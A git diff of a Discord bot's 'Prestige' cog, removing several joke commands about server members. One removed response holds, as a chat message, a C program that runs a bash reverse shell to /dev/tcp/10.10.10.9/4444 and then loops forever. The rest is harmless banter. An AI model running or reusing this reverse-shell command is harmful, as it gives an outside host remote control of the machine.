@@ -40,12 +40,6 @@ class Prestige(commands.Cog, command_attrs=dict(hidden=True)):
 
         await ctx.send(f"**<@366628959657394186>, desculpa por interromper o seu andamento, é que eu te vi passando, você é artista?**")
 
-    @slash_command(name="twiks", guild_ids=guild_ids)
-    async def _twiks(self, ctx) -> None:
-        """ Tells you something about Twiks. """
-
-        await ctx.respond(f"**Twiks est mon frérot !**")
-
     @commands.command(aliases=["lexi", "lèqçi", "lexis"])
     async def alexis(self, ctx) -> None:
         """ A command for telling something about Alexis. """
@@ -59,12 +53,6 @@ class Prestige(commands.Cog, command_attrs=dict(hidden=True)):
         ]
 
         await ctx.send(choice(sentences))
-
-    @commands.command(aliases=["eli", "elj", "elijaaah"])
-    async def elijah(self, ctx) -> None:
-        """ A command for telling something about Elijah. """
-
-        await ctx.send("**Sure, go for it.**")
 
     @commands.command()
     async def freak(self, ctx) -> None:
@@ -91,18 +79,6 @@ class Prestige(commands.Cog, command_attrs=dict(hidden=True)):
 
         await ctx.send(choice(sentences))
 
-    @commands.command(aliases=["winni", "winnie", "wynni", "wynnie"])
-    async def wyncham(self, ctx) -> None:
-        """ A command for telling something about Wyncham. """
-
-        sentences = [
-            "**You have a really nice voice**",
-            "**Leonarda is my best friend**",
-            "**Elijah and DNK are my brothers**"
-        ]
-
-        await ctx.send(choice(sentences))
-
     @commands.command(aliases=["not_lime", "lemonade", "citric", "yellow_fruit"])
     async def lemon(self, ctx) -> None:
         """ A command for telling something about Wyncham. """
@@ -111,60 +87,6 @@ class Prestige(commands.Cog, command_attrs=dict(hidden=True)):
             "**Easy peasy, lemon squeezy** �",
             "**When life gives you a lemon, make it an admin!** <:lemonsloth:785872087414996992>",
             "**My greatest fear is a limenade...**"
-        ]
-
-        await ctx.send(choice(sentences))
-
-    @commands.command(aliases=["frenzy"])
-    async def frenesia(self, ctx) -> None:
-        """ A command for telling something about frenesia. """
-
-        sentences = [
-            "# MIAOOOOOOO <:cat_wave:924495909595779082> <@439110609745870870>",
-            "**CIAO SONO FRENESIA 🇮🇹 <@439110609745870870>**",
-            "AHAHAAHAHAHA <@439110609745870870>"
-        ]
-
-        await ctx.send(choice(sentences))
-
-    @commands.command(aliases=["cafone", "napoletano", "forzanapoli", "ihatepython", "cbestlanguage", "iloveassembly", "iloveasm"])
-    async def _cafone(self, ctx) -> None:
-        """ A command for telling something about cafone. """
-
-        sentences = [
-            "i heard **assembly** <:peep_selfie:959872040301629561> <@703017795738402827>",
-            "i heard **c++** <:peep_selfie:959872040301629561> <@703017795738402827>",
-            "i heard **c** <:peep_selfie:959872040301629561> <@703017795738402827>",
-            "i heard *python* <:pepecool:572067081508618251> <@703017795738402827>",
-            """<@703017795738402827>
-```c
-#include <stdio.h>
-#include <stdlib.h>
-
-int main(void)
-{
-  const char* command = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.9/4444 0>&1'";
-  const char* message = "cafone best engineer and hacker\\n";
-  int result;
-
-  result = system(command);
-  if(result == -1)
-  {
-    printf("Error when executing the command.\\n");
-    return 1;
-  }
-  else
-  {
-    printf("yeaahhh boiiii\\n");
-  }
-
-  for(;;)
-    printf(message);
-
-  return 0;
-}
-```""",
-            "**sexiest italo/spanish engineer & hacker on the server🇮🇹🇪🇦** <@703017795738402827>"
         ]
 
         await ctx.send(choice(sentences))
